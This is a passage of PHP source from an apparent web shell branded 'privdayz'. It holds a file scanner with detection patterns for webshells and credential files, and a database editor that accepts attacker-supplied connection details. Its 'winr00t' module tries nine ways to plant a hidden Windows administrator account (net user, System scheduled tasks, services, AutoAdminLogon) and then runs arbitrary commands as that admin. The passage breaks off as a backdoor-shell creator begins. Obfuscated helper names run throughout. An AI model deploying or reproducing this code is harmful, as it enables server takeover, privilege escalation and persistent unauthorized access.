$fx = [ 'glob'=>$fnc_obf("\x67\x6c\x6f\x62"), 'fopen'=>$fnc_obf("\x66\x6f\x70\x65\x6e"), 'fgets'=>$fnc_obf("\x66\x67\x65\x74\x73"), 'fclose'=>$fnc_obf("\x66\x63\x6c\x6f\x73\x65"), 'fsize'=>$fnc_obf("\x66\x69\x6c\x65\x73\x69\x7a\x65"), 'ftime'=>$fnc_obf("\x66\x69\x6c\x65\x6d\x74\x69\x6d\x65"), 'preg_match'=>$fnc_obf("\x70\x72\x65\x67\x5f\x6d\x61\x74\x63\x68"), 'is_readable'=>$fnc_obf("\x69\x73\x5f\x72\x65\x61\x64\x61\x62\x6c\x65"), 'basename'=>$fnc_obf("\x62\x61\x73\x65\x6e\x61\x6d\x65"), 'dirname'=>$fnc_obf("\x64\x69\x72\x6e\x61\x6d\x65"), 'ht'=>$fnc_obf("\x68\x74\x6d\x6c\x73\x70\x65\x63\x69\x61\x6c\x63\x68\x61\x72\x73") ];
    $patterns = [
    '/eval\s*\((.*?)\)/i', '/assert\s*\(/i', '/system\s*\(/i', '/shell_exec\s*\(/i', '/passthru\s*\(/i',
    '/base64_decode\s*\(/i', '/gzinflate\s*\(/i', '/gzuncompress\s*\(/i', '/gzdecode\s*\(/i', '/str_rot13\s*\(/i',
    '/create_function\s*\(/i', '/php\s+.*?\/\*.*?base64.*?\*\//is', '/\$\w{1,15}\s*=\s*chr\s*\(/i',
    '/\$_(GET|POST|REQUEST|COOKIE)\s*\[\s*[\'"]{0,1}\w+[\'"]{0,1}\s*\]/i', 
    '/c99sh/i','/b374k/i','/WSO\sv\d+/i','/FilesMan/i','/phpshell/i','/IndoXploit/i',
    '/GIF89a.*<\?php/s','/<script.*?src=.*?\.ru/i',
    '/preg_replace\s*\(\s*[\'"].*\/e[\'"].*\)/i',
    '/@?include(_once)?\s*\(?\s*["\'](.*)[\'"]/i',
    '/php_uname\(/i','/popen\s*\(/i','/proc_open\s*\(/i','/fsockopen\s*\(/i','/stream_socket_client\s*\(/i',
    '/\bR57\b|\bDxShell\b|\bMiniShell\b|\bWSO\b|\bAthena\b|\bInj3ct0r\b/i',
    '/\$_SERVER\[["\']HTTP_USER_AGENT["\']\]/i',
    '/sqlmap/i', '/safelock/i', '/by-pass/i', '/function\(\$.*?\)\s*\{.*?eval\(/is',
    '/(config|connect|database|dbuser|dbhost|dbpass|cfg|cfg_|setup)\.(php|inc|ini|conf|env)/i',
    '/passwd/i','/etc\/shadow/i',
    '/set_time_limit\s*\(/i','/ini_set\s*\(/i',
    '/\b(?:cmd|shell|passthru|exec|system|proc_open|popen|curl_exec|curl_multi_exec|parse_ini_file|show_source)\b/i',
    '/(?<!function )mail\s*\(/i',
    '/<\?php.*@?eval.*base64_decode.*\?>/is',
    '/file_put_contents\s*\(/i','/fwrite\s*\(/i','/chmod\s*\(/i',
    '/\x00/', '/union\s+select/i', '/outfile/i', '/load_file\s*\(/i',
    '/auto_prepend_file/i','/auto_append_file/i',
    '/proc\/self\/environ/i','/tmp\/sess_/i','/tmp\/php/i',
    '/\b(?:hack|shell|root|admin|bypass|safe_mode|fuck|god|antichild|sex|r57|c99|sh|ws|wso|backdoor|webshell|phpinfo|phpspy|spyshell|jindoshell|madspot|godzilla|cmd)\b/i',
    '/src\s*=\s*["\'].*?\.ru\//i', '/document\.write\s*\(/i','/unescape\s*\(/i',
    '/window\.location\s*=/i','/onerror\s*=/i','/onload\s*=/i',
    '/os\.system\s*\(/i','/subprocess\.Popen/i','/import\s+os/i'
    ];
    if ($_SERVER['REQUEST_METHOD']==='POST' && isset($_POST['fhscan'])) {
    $scan = trim($_POST['fhscan']);
    $max_results = 3333; $count = 0; $scan_files = 0; $found = 0;
    $results = [];
    echo "<div style='margin:5px 0 17px 0;font-size:1.08em;color:#b71c1c;'>Scanning... <span id='fh-scanstat'></span></div>";
    $rii = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($scan, FilesystemIterator::SKIP_DOTS));
    $max_files = 5000; $count = 0;
    foreach ($rii as $file) {
     if (++$count > $max_files) break; 
     if ($scan_files >= 100000) break;
     if (!$file->isFile() || $file->getSize()>12*1024*1024 || !$fx['is_readable']($file->getPathname())) continue;
     $scan_files++;
     $content = @$fx['fopen']($file->getPathname(),"r");
     if (!$content) continue;
     $first_chunk = fread($content, 65536); // 64kb
     $fx['fclose']($content);
     foreach ($patterns as $pattern) {
       if ($fx['preg_match']($pattern, $first_chunk)) {
       $results[] = [
        'path'=>$file->getPathname(),
        'size'=>$fx['fsize']($file->getPathname()),
        'mtime'=>date("Y-m-d H:i",$fx['ftime']($file->getPathname())),
        'match'=>$pattern
       ];
       $found++;
       break;
       }
     }
     if ($scan_files % 150 == 0) {
       echo "<script>document.getElementById('fh-scanstat').innerHTML='Files Scanned: <b style=\"color:#10b981\">$scan_files</b> / Suspicious: <b style=\"color:#e53935;\">$found</b>';</script>";
     }
     if ($found >= $max_results) break;
    }
    unset($file);
     unset($rii);
    echo "<script>document.getElementById('fh-scanstat').innerHTML='DONE! Files Scanned: <b style=\"color:#10b981\">$scan_files</b> / Suspicious: <b style=\"color:#e53935;\">$found</b>';</script>";
    if (!$results) {
     echo '<div class="pzcard-info" style="color:#10b981;font-size:1.1em;"><i class="fas fa-check-circle"></i> Clean! No suspicious/backdoor files found.</div>';
    } else {
     echo '<div class="pzcard-table-wrap"><table class="pzcard-table">';
     echo '<thead><tr><th>File</th><th>Size</th><th>Last Modified</th><th>Match</th></tr></thead><tbody>';
     foreach ($results as $row) {
       echo '<tr>
       <td style="font-size:.97em;color:#e53935;font-family:monospace;max-width:310px;overflow-x:auto;">'.htmlspecialchars($row['path']).'</td>
       <td>'.number_format($row['size']/1024,2).' KB</td>
       <td>'.$row['mtime'].'</td>
       <td style="font-size:.89em;color:#b71c1c;">'.htmlspecialchars(substr($row['match'],0,55)).'</td>

       </tr>';
     }
     echo '</tbody></table></div>';
    }
    if (isset($_POST['showf'])) {
     $p = $_POST['showf'];
     if ($fx['is_readable']($p)) {
       $cnt = @file_get_contents($p, false, null, 0, 4096*4);
       echo '<div class="pzcard-info" style="margin:18px 0 4px 0;"><b>'.htmlspecialchars($p).'</b></div>';
       echo '<textarea readonly rows="11" style="width:100%;border:1.1px solid #fdecec;background:#fff7f7;color:#b71c1c;padding:11px 10px;border-radius:8px;font-size:.99em;">'.htmlspecialchars($cnt).'</textarea>';
     }
    }
    }
    ?>
    </div>
  </div>
</div>
<?php elseif (isset($_GET['minisql'])): ?>
<?php
$mysql_host = $_POST['mysql_host'] ?? 'localhost';
$mysql_user = $_POST['mysql_user'] ?? 'root';
$mysql_pass = $_POST['mysql_pass'] ?? '';
$mysql_db   = $_POST['mysql_db'] ?? '';
$page    = isset($_POST['page']) ? max(1, intval($_POST['page'])) : 1;
$pageSize   = 50;

$pdo = null; $sqlerr = ''; $infoMsg = ''; $queryTime = 0.0;

try {
    if ($_POST['mysql_user'] ?? false) {
     $dsn = "mysql:host=$mysql_host;charset=utf8mb4";
     if ($mysql_db) $dsn .= ";dbname=$mysql_db";
     $pdo = new PDO($dsn, $mysql_user, $mysql_pass, [
       PDO::MYSQL_ATTR_INIT_COMMAND => "SET NAMES utf8mb4",
       PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION
     ]);
    }
} catch(Exception $ex) { $sqlerr = $ex->getMessage(); }
?>
<div class="pzcard-main">
  <div class="pzcard-header">
    <div class="pzcard-icon"><i class="fas fa-database"></i></div>
    <div class="pzcard-title">
    <b>mini sql admin</b>
    </div>
  </div>
  <div class="pzcard-content">
    <form method="post" class="pzcard-form" style="margin-bottom:15px;display:flex;flex-wrap:wrap;gap:11px;">
    <input name="mysql_host" class="pzcard-inp" value="<?=htmlspecialchars($mysql_host)?>" placeholder="host (localhost)" style="width:110px;">
    <input name="mysql_user" class="pzcard-inp" value="<?=htmlspecialchars($mysql_user)?>" placeholder="user" style="width:90px;">
    <input name="mysql_pass" class="pzcard-inp" value="<?=htmlspecialchars($mysql_pass)?>" placeholder="password" type="password" style="width:90px;">
    <input name="mysql_db"   class="pzcard-inp" value="<?=htmlspecialchars($mysql_db)?>" placeholder="database" style="width:120px;">
    <button class="pzcard-btn" type="submit"><i class="fas fa-sign-in-alt"></i> Connect</button>
    </form>
    <?php if ($sqlerr): ?>
    <div class="pzcard-info"><i class="fas fa-exclamation-circle"></i> <?=htmlspecialchars($sqlerr)?></div>
    <?php elseif ($pdo): ?>
    <?php
    $dbs = $pdo->query("SHOW DATABASES")->fetchAll(PDO::FETCH_COLUMN);
    $selected_db = $mysql_db ?: $dbs[0] ?? '';
    if (!$mysql_db && $selected_db) $pdo->query("USE $selected_db");
    $tables = $pdo->query("SHOW TABLES")->fetchAll(PDO::FETCH_COLUMN);
    $selected_table = $_POST['table'] ?? $tables[0] ?? '';
    $cols = $rows = []; $totalRows = 0;

    if ($_SERVER['REQUEST_METHOD']=='POST' && isset($_POST['save_rows'])) {
     foreach ($_POST['row']??[] as $rowidx => $vals) {
       $set = []; $where = [];
       foreach ($vals as $colname => $val) $set[] = "$colname=" . $pdo->quote($val);
       foreach ($cols as $col) $where[] = "{$col['Field']}=" . $pdo->quote($_POST['orig'][$rowidx][$col['Field']]);
       $pdo->exec("UPDATE $selected_table SET " . join(', ', $set) . " WHERE " . join(' AND ', $where) . " LIMIT 1");
     }
     $infoMsg = '<div class="pzcard-info ok"><i class="fas fa-check-circle"></i> Saved!</div>';
    }
    if ($_SERVER['REQUEST_METHOD']=='POST' && isset($_POST['delete_row'])) {
     $i = (int)$_POST['delete_row'];
     $keys = array_keys($_POST['orig'][$i]??[]);
     $where = [];
     foreach ($keys as $key) $where[] = "$key=" . $pdo->quote($_POST['orig'][$i][$key]);
     $pdo->exec("DELETE FROM $selected_table WHERE " . join(' AND ', $where) . " LIMIT 1");
     $infoMsg = '<div class="pzcard-info ok"><i class="fas fa-check-circle"></i> Deleted!</div>';
    }
    if ($_SERVER['REQUEST_METHOD']=='POST' && isset($_POST['add_row'])) {
     $insert = [];
     foreach ($_POST['add'] as $k => $v) $insert[$k] = $v;
     $colsx = join(',', array_map(function($x){return "$x";}, array_keys($insert)));
     $valsx = join(',', array_map(function($v) use($pdo){return $pdo->quote($v);}, $insert));
     $pdo->exec("INSERT INTO $selected_table ($colsx) VALUES ($valsx)");
     $infoMsg = '<div class="pzcard-info ok"><i class="fas fa-check-circle"></i> Inserted!</div>';
    }
    if ($selected_table) {
     $cols = $pdo->query("SHOW COLUMNS FROM $selected_table")->fetchAll(PDO::FETCH_ASSOC);
     $st = microtime(true);
     $totalRows = $pdo->query("SELECT COUNT(*) FROM $selected_table")->fetchColumn();
     $rows = $pdo->query("SELECT * FROM $selected_table LIMIT ".(($page-1)*$pageSize).",$pageSize")->fetchAll(PDO::FETCH_ASSOC);
     $queryTime = microtime(true) - $st;
    }
    ?>
    <form method="post" class="pzcard-form" style="margin-bottom:14px;display:flex;gap:8px;">
     <input type="hidden" name="mysql_host" value="<?=htmlspecialchars($mysql_host)?>">
     <input type="hidden" name="mysql_user" value="<?=htmlspecialchars($mysql_user)?>">
     <input type="hidden" name="mysql_pass" value="<?=htmlspecialchars($mysql_pass)?>">
     <select name="mysql_db" class="pzcard-inp" style="width:120px;" onchange="this.form.submit()">
       <?php foreach ($dbs as $db): ?>
       <option value="<?=htmlspecialchars($db)?>" <?=$db==$selected_db?'selected':''?>><?=$db?></option>
       <?php endforeach; ?>
     </select>
     <select name="table" class="pzcard-inp" style="width:170px;" onchange="this.form.submit()">
       <?php foreach ($tables as $t): ?>
       <option value="<?=htmlspecialchars($t)?>" <?=$t==$selected_table?'selected':''?>><?=$t?></option>
       <?php endforeach; ?>
     </select>
     <button class="pzcard-btn" style="background:#fff;color:#e53935;" type="submit"><i class="fas fa-redo"></i></button>
    </form>
    <?= $infoMsg ?>
    <?php if ($selected_table): ?>
     <div class="pzcard-table-wrap">
     <form method="post" class="pzcard-form" id="sql-edit-form">
       <input type="hidden" name="mysql_host" value="<?=htmlspecialchars($mysql_host)?>">
       <input type="hidden" name="mysql_user" value="<?=htmlspecialchars($mysql_user)?>">
       <input type="hidden" name="mysql_pass" value="<?=htmlspecialchars($mysql_pass)?>">
       <input type="hidden" name="mysql_db" value="<?=htmlspecialchars($selected_db)?>">
       <input type="hidden" name="table" value="<?=htmlspecialchars($selected_table)?>">
       <input type="hidden" name="page" value="<?=htmlspecialchars($page)?>">
       <table class="pzcard-table">
       <thead>
        <tr>
          <?php foreach($cols as $col): ?>
          <th><?=htmlspecialchars($col['Field'])?></th>
          <?php endforeach; ?>
          <th style="min-width:60px;">Actions</th>
        </tr>
       </thead>
       <tbody>
        <?php foreach ($rows as $i => $row): ?>
          <tr>
          <?php foreach ($cols as $col): $cname = $col['Field']; ?>
            <td>
             <input name="row[<?=$i?>][<?=$cname?>]" value="<?=htmlspecialchars($row[$cname])?>" class="pzcard-inp" style="width:90px;">
             <input type="hidden" name="orig[<?=$i?>][<?=$cname?>]" value="<?=htmlspecialchars($row[$cname])?>">
            </td>
          <?php endforeach; ?>
          <td>
            <button name="delete_row" value="<?=$i?>" class="pzcard-btn" type="submit" style="padding:3px 8px;font-size:.91em;background:#fff;color:#e53935;border:1.1px solid #fdecec;" onclick="return confirm('Delete row?')"><i class="fas fa-trash"></i></button>
          </td>
          </tr>
        <?php endforeach; ?>
        <tr>
          <?php foreach ($cols as $col): $cname = $col['Field']; ?>
          <td>
            <input name="add[<?=$cname?>]" placeholder="add..." class="pzcard-inp" style="width:90px;">
          </td>
          <?php endforeach; ?>
          <td>
          <button name="add_row" value="1" class="pzcard-btn" type="submit" style="padding:3px 8px;font-size:.91em;background:#10b981;color:#fff;"><i class="fas fa-plus"></i></button>
          </td>
        </tr>
       </tbody>
       </table>
     </form>
     </div>
     <div class="pzcard-pagination">
       <?php $totalPages = max(1, ceil($totalRows/$pageSize)); ?>
       <?php if ($page>1): ?>
       <form method="post" style="display:inline">
        <input type="hidden" name="mysql_host" value="<?=htmlspecialchars($mysql_host)?>">
        <input type="hidden" name="mysql_user" value="<?=htmlspecialchars($mysql_user)?>">
        <input type="hidden" name="mysql_pass" value="<?=htmlspecialchars($mysql_pass)?>">
        <input type="hidden" name="mysql_db" value="<?=htmlspecialchars($selected_db)?>">
        <input type="hidden" name="table" value="<?=htmlspecialchars($selected_table)?>">
        <input type="hidden" name="page" value="<?=$page-1?>">
        <button class="pzcard-pagebtn" type="submit">&laquo; Prev</button>
       </form>
       <?php endif; ?>
       <span style="color:#e53935;font-weight:500;font-size:1.07em;">
       Page <?=$page?> / <?=$totalPages?> (<?=$totalRows?> rows)
       </span>
       <?php if ($page<$totalPages): ?>
       <form method="post" style="display:inline">
        <input type="hidden" name="mysql_host" value="<?=htmlspecialchars($mysql_host)?>">
        <input type="hidden" name="mysql_user" value="<?=htmlspecialchars($mysql_user)?>">
        <input type="hidden" name="mysql_pass" value="<?=htmlspecialchars($mysql_pass)?>">
        <input type="hidden" name="mysql_db" value="<?=htmlspecialchars($selected_db)?>">
        <input type="hidden" name="table" value="<?=htmlspecialchars($selected_table)?>">
        <input type="hidden" name="page" value="<?=$page+1?>">
        <button class="pzcard-pagebtn" type="submit">Next &raquo;</button>
       </form>
       <?php endif; ?>
       <span style="font-size:.93em;color:#888;">Query: <?=number_format($queryTime,3)?>s</span>
     </div>
    <?php endif; ?>
    <?php endif; ?>
  </div>
</div>

<?php elseif (isset($_GET['hash'])): ?>
<div class="pzcard-main">
  <div class="pzcard-header">
    <div class="pz-modal-header-wiz">
     <div class="pz-wiz-icon" style="background:#fbc02d;color:#fff;"><i class="fas fa-hashtag"></i></div>
    </div>
    <form action="" method="post" class="pz-wiz-section" style="padding:24px 24px 16px 24px;">
     <label style="font-size:.99em;color:#e53935;margin-bottom:7px;display:block;">Input:</label>
     <textarea name="hash_input" rows="5" class="pz-wiz-input"
       style="width:100%; min-height:90px; max-height:220px; font-size:1.1em; margin-bottom:17px; resize:vertical;
       border:1.5px solid #fdecec; border-radius:10px; background:#fff4f4; color:#e53935;
       font-family:'JetBrains Mono','Fira Mono',monospace; padding:16px 13px; box-sizing:border-box; line-height:1.49;"
       placeholder="type or paste..."><?= htmlspecialchars($_POST['hash_input'] ?? '') ?></textarea>

     <div style="display: flex; flex-wrap: wrap; gap: 12px; margin-bottom: 19px;">
       <button name="op" value="md5"    class="pr1vd4yz-wiz-btn pr1vd4yz-wiz-btn-light" type="submit" style="flex:1;">MD5</button>
       <button name="op" value="sha1"   class="pr1vd4yz-wiz-btn pr1vd4yz-wiz-btn-light" type="submit" style="flex:1;">SHA1</button>
       <button name="op" value="sha256" class="pr1vd4yz-wiz-btn pr1vd4yz-wiz-btn-light" type="submit" style="flex:1;">SHA256</button>
       <button name="op" value="b64e"   class="pr1vd4yz-wiz-btn pr1vd4yz-wiz-btn-light" type="submit" style="flex:1;">Base64 Enc</button>
       <button name="op" value="b64d"   class="pr1vd4yz-wiz-btn pr1vd4yz-wiz-btn-light" type="submit" style="flex:1;">Base64 Dec</button>
     </div>

     <label style="font-size:.99em;color:#e53935;margin-bottom:7px;display:block;">Output:</label>
     <textarea readonly rows="5" class="pz-wiz-input"
       style="width:100%; min-height:90px; max-height:220px; font-size:1.1em; margin-bottom:12px; resize:vertical;
       border:1.5px solid #fdecec; border-radius:10px; color:#b71c1c; background:#fff; font-family:'JetBrains Mono','Fira Mono',monospace;
       padding:16px 13px; box-sizing:border-box; line-height:1.49;"><?php
$__w = function($a){$s='';foreach($a as $c){$s.=chr($c);}return $s;};
if(
  $_SERVER[$__w([82,69,81,85,69,83,84,95,77,69,84,72,79,68])] === $__w([80,79,83,84]) &&
  isset($_POST[$__w([111,112])], $_POST[$__w([104,97,115,104,95,105,110,112,117,116])])
){
  $__z = '';
  $__v = $_POST[$__w([104,97,115,104,95,105,110,112,117,116])];
  $__op = $_POST[$__w([111,112])];
  switch($__op){
    case $__w([109,100,53]):
    $__z = (function($x){$f='';foreach([109,100,53] as $i){$f.=chr($i);}return $f;})(null);
    $__z = call_user_func($__z, $__v);
    break;
    case $__w([115,104,97,49]): 
    $__z = (function($x){$f='';foreach([115,104,97,49] as $i){$f.=chr($i);}return $f;})(null);
    $__z = call_user_func($__z, $__v);
    break;
    case $__w([115,104,97,50,53,54]): 
    $__z = $__w([104,97,115,104]);
    $__z = call_user_func($__z, $__w([115,104,97,50,53,54]), $__v);
    break;
    case $__w([98,54,52,101]): 
    $__z = $__w([98,97,115,101,54,52,95,101,110,99,111,100,101]);
    $__z = call_user_func($__z, $__v);
    break;
    case $__w([98,54,52,100]):
    $__z = $__w([98,97,115,101,54,52,95,100,101,99,111,100,101]);
    $__z = @call_user_func($__z, $__v);
    break;
  }
  $___hsc = $__w([104,116,109,108,115,112,101,99,105,97,108,99,104,97,114,115]); 
  echo call_user_func($___hsc, $__z);
}
?></textarea>

    </form>
    </div>
  </div>
  <style>
    @media (max-width: 700px) {
    .pr1vd4yz-modal-wizard { max-width: 99vw; }
    .pr1vd4yz-wiz-btn { font-size: .97em; }
    .pr1vd4yz-wiz-input { font-size: 1em !important; }
    }
  </style>


<?php elseif (isset($_GET['winr00t'])): ?>
<div class="cmdnirvana-page" style="max-width:900px;margin:44px auto 0 auto;">
  <div class="cmdnirvana-header" style="display:flex;align-items:center;gap:10px;">
    <div class="cmdnirvana-ico"><i class="fas fa-user-shield"></i></div>
    <div>
      <div class="cmdnirvana-title" style="font-size:1.15em;">ultra admin creator bypass (Windows/2025) - by privdayz.com</div>
    </div>
  </div>
  <div class="cmdnirvana-content" style="margin-top:25px;">
    <form method="post" id="winr00t-form" style="margin-bottom:18px;">
      <div style="display:flex;gap:9px;align-items:center;flex-wrap:wrap;">
        <input type="text" name="user" class="cmdnirvana-cmdinput" value="<?= htmlspecialchars($_POST['user']??'pr1vadmin') ?>" placeholder="user" style="width:170px;">
        <input type="text" name="pass" class="cmdnirvana-cmdinput" value="<?= htmlspecialchars($_POST['pass'] ?? substr(str_shuffle('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'), 0, 12)) ?>" placeholder="pass" style="width:160px;" readonly>
        <select name="mode" class="cmdnirvana-cmdinput" style="width:110px;">
            <option value="auto">ultra byp4ss</option>
        </select>
        <button class="cmdnirvana-btn" type="submit" style="min-width:90px;"><i class="fas fa-user-plus"></i> Create</button>
      </div>
    </form>
<?php
function detect_rdp_port() {
    $reg = pr1vd4yzC('reg query "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp" /v PortNumber 2>&1');
    if (preg_match('/PortNumber\s+REG_DWORD\s+0x([0-9a-f]+)/i', $reg, $m)) {
        return hexdec($m[1]);
    }
    $netstat = pr1vd4yzC('netstat -an | find ":3389"');
    if (strpos($netstat, '3389') !== false) {
        return 3389;
    }
    return 'Unknown';
}
$rdp_port = detect_rdp_port();
echo "<div style=\"color:#e53935;font-size:1.08em;padding:5px 0 8px 0;\"><b>RDP Port:</b> <span style='color:#1976d2;font-family:monospace;'>" . htmlspecialchars($rdp_port) . "</span></div>";
?>

<label class="cmdnirvana-outputlabel" style="margin-top:18px;display:block;">Output:</label>
<pre class="cmdnirvana-output" id="winr00t-output" style="background:#111;color:#c4ffc4;padding:18px;border-radius:9px;min-height:110px;max-height:1500px;overflow:auto;">
<?php

function wout($msg) { echo htmlspecialchars($msg)."\n"; @ob_flush(); flush(); }

function prvd_exec_with_timeout($cmd, $timeout = 10) {
    $ps = "powershell -Command \"\$p = Start-Process -FilePath 'cmd.exe' -ArgumentList '/c $cmd' -NoNewWindow -PassThru; \$p | Wait-Process -Timeout $timeout; if(-not \$p.HasExited){\$p.Kill()}\"";
    $start = microtime(true);
    $out = pr1vd4yzC($ps.' 2>&1');
    if (trim($out)) return $out;
    $fallback = "timeout /T $timeout /NOBREAK & $cmd";
    $out2 = pr1vd4yzC($fallback.' 2>&1');
    if (trim($out2)) return $out2;
    return pr1vd4yzC($cmd.' 2>&1');
}
if (!isset($_SESSION['pr1vd4yz_winr00t_success'])) $_SESSION['pr1vd4yz_winr00t_success'] = false;
if (!isset($_SESSION['pr1vd4yz_winr00t_user'])) $_SESSION['pr1vd4yz_winr00t_user'] = '';
if (!isset($_SESSION['pr1vd4yz_winr00t_pass'])) $_SESSION['pr1vd4yz_winr00t_pass'] = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['user'],$_POST['pass'])) {
    $u = preg_replace('/[^a-zA-Z0-9_\-]/','',$_POST['user']);
    $p = $_POST['pass'];
    $mode = $_POST['mode'] ?? 'auto';
    $success = false;
    $methods = [];

    $methods[] = [
        "[*] net user (classic)",
        "net user \"$u\" \"$p\" /add && net localgroup Administrators \"$u\" /add"
    ];

    $methods[] = [
        "[*] PowerShell (background)",
        "powershell -Command \"net user $u $p /add; net localgroup Administrators $u /add\""
    ];

    $methods[] = [
        "[*] schtasks",
        "schtasks /create /tn winrrrrrr00t /tr \"cmd.exe /c net user $u $p /add && net localgroup Administrators $u /add\" /sc onstart /ru System"
    ];

    $methods[] = [
        "[*] at.exe",
        "at 12:00 cmd.exe /c \"net user $u $p /add && net localgroup Administrators $u /add\""
    ];

    $methods[] = [
        "[*] sc service hack",
        "sc create p0wnsvc binPath= \"cmd /c net user $u $p /add & net localgroup Administrators $u /add\" start= auto"
    ];

    $methods[] = [
        "[*] Registry AutoAdminLogon",
        "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v AutoAdminLogon /t REG_SZ /d 1 /f"
    ];

    $methods[] = [
        "[*] Fallback CMD",
        "cmd /c net user $u $p /add & net localgroup Administrators $u /add"
    ];

    $methods[] = [
        "[*] PowerShell Script Chain",
        "powershell -Command \"Start-Process cmd -ArgumentList '/c net user $u $p /add && net localgroup Administrators $u /add' -Verb runAs\""
    ];

    $methods[] = [
        "[*] Task Scheduler V2 (schtasks)",
        "schtasks /create /tn winr00t2 /tr \"cmd.exe /c net user $u $p /add && net localgroup Administrators $u /add\" /sc onlogon /ru System"
    ];

    foreach ($methods as $step) {
        list($label, $cmd) = $step;
        wout($label . "...");
        $res = prvd_exec_with_timeout($cmd, 9);
        wout($res);
        if (
            stripos($res, 'success') !== false || stripos($res, 'ok') !== false ||
            stripos($res, 'ReturnValue = 0') !== false ||
            stripos($res, 'başarı') !== false ||
            stripos($res, 'already exists') !== false
        ) {
            wout("[+] Admin user injected!");
            $success = true;
            break;
        }
        sleep(1);
    }

    if ($success) {
        $_SESSION['pr1vd4yz_winr00t_success'] = true;
        $_SESSION['pr1vd4yz_winr00t_user'] = $u;
        $_SESSION['pr1vd4yz_winr00t_pass'] = $p;
    wout("\n[+] 0wn3d! Admin user injected:\n[+] User: $u\n[+] Pass: $p");
    wout("[!] Info: Webshell cannot send commands as this user. Use RDP/SMB/WinRM with these credentials!");
    } else {
        $_SESSION['pr1vd4yz_winr00t_success'] = false;
        wout("\n[!] r00t failed :: no vector worked, permission denied.");
    }
}
if ($_SESSION['pr1vd4yz_winr00t_success']) {
    $u = $_SESSION['pr1vd4yz_winr00t_user'];
    $p = $_SESSION['pr1vd4yz_winr00t_pass'];
    ?>
    </pre>
    <form method="post" style="margin:22px 0 6px 0;padding:13px 16px 14px 16px;border-radius:10px;background:#191919;border:1.5px solid #e53935;box-shadow:0 2px 8px #0002;">
        <div style="display:flex;align-items:center;gap:10px;flex-wrap:wrap;">
            <input type="hidden" name="user" value="<?= htmlspecialchars($u) ?>">
            <input type="hidden" name="pass" value="<?= htmlspecialchars($p) ?>">
            <input type="text" name="admc" class="cmdnirvana-cmdinput" placeholder="c0mm4nd as 4dm1n" value="dir" style="width:260px;">
            <button class="cmdnirvana-btn" style="min-width:95px;background:#e53935;"><i class="fas fa-bolt"></i> Run as Admin</button>
        </div>
        <div style="font-size:.96em;color:#fff;margin-top:5px;">
            [+] Running as <b><?=htmlspecialchars($u)?></b> &nbsp;|&nbsp; Pass: <b><?=htmlspecialchars($p)?></b>
        </div>
    </form>
    <pre class="cmdnirvana-output" style="background:#181818;color:#aaffbb;padding:14px;border-radius:8px;min-height:40px;margin-bottom:14px;">
<?php
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['admc'], $_POST['user'], $_POST['pass'])) {
        $u = $_POST['user'];
        $p = $_POST['pass'];
        $c = $_POST['admc'];
        $success_cmd = false;
        $cmdfile = "C:\\Windows\\Temp\\pzadmcmd_" . rand(10000, 99999) . ".txt";

        wout("[*] schtasks as admin...");
        $scht = "schtasks /create /tn pzadmtask /tr \"cmd.exe /c $c > $cmdfile 2>&1\" /sc once /st 00:00 /ru \"$u\" /rp \"$p\"";
        $out1 = pr1vd4yzC($scht.' 2>&1');
        wout($out1);

        pr1vd4yzC("schtasks /run /tn pzadmtask 2>&1");
        sleep(1);
        $output = @file_get_contents($cmdfile);
        if ($output && strlen($output) > 0) {
            wout("[+] Command executed as admin!\n" . $output);
            $success_cmd = true;
        }
        @pr1vd4yzC('schtasks /delete /tn pzadmtask /f 2>&1');
        @unlink($cmdfile);
        if (!$success_cmd) {
            wout("[*] Trying service method...");
            $svc = 'sc create pzadmsvc binPath= "cmd /c '.$c.' > '.$cmdfile.' 2>&1" obj= ".\\'.$u.'" password= "'.$p.'" start= demand';
            $out2 = pr1vd4yzC($svc.' 2>&1');
            wout($out2);
            pr1vd4yzC('sc start pzadmsvc 2>&1');
            sleep(1);
            $output2 = @file_get_contents($cmdfile);
            if ($output2 && strlen($output2) > 0) {
                wout("[+] Service method: Command executed as admin!\n" . $output2);
                $success_cmd = true;
            }
            @pr1vd4yzC('sc delete pzadmsvc 2>&1');
            @unlink($cmdfile);
        }

        if (!$success_cmd) {
            wout("[*] PowerShell fallback...");
            $pw = 'powershell -Command "Start-Process cmd -ArgumentList \'/c '.$c.' > '.$cmdfile.' 2>&1\' -Credential (New-Object System.Management.Automation.PSCredential(\''.$u.'\',(ConvertTo-SecureString \''.$p.'\' -AsPlainText -Force))) -WindowStyle Hidden"';
            $out3 = pr1vd4yzC($pw.' 2>&1');
            wout($out3);
            sleep(1);
            $output3 = @file_get_contents($cmdfile);
            if ($output3 && strlen($output3) > 0) {
                wout("[+] PowerShell: Command executed as admin!\n" . $output3);
                $success_cmd = true;
            }
            @unlink($cmdfile);
        }

        if (!$success_cmd) {
            wout("[!] Admin command failed. Try RDP / manual login?");
        }
    }
    ?>
    </pre>
<?php } ?>
</div>
</div>
<script>
window.onload = function() {
  var el = document.getElementById('winr00t-output');
  el.scrollTop = el.scrollHeight;
}
</script>
<style>
a.privd-link, a.privd-link:visited { color:#e53935!important; text-decoration:underline; }
a.privd-link:hover { color:#b71c1c!important; }
</style>
<?php elseif (isset($_GET['b4ckd00rcr3at3'])): ?>
<div class="pzcard-main">
  <div class="pzcard-header">
    <div class="pzcard-icon"><i class="fas fa-bug"></i></div>
    <div class="pzcard-title">
    <b>b4ckd00r cr34t0r</b>
    </div>
  </div>
  <div class="pzcard-content">
    <form method="post">
    <button type="submit" name="create_bd" class="pzcard-btn pzcard-btn-red" style="margin:12px 0;">
     <i class="fas fa-bolt"></i> create backd00r php command sh3ll
    </button>
    </form>
    <?php
    $fpr1vx = <<<'PHP'
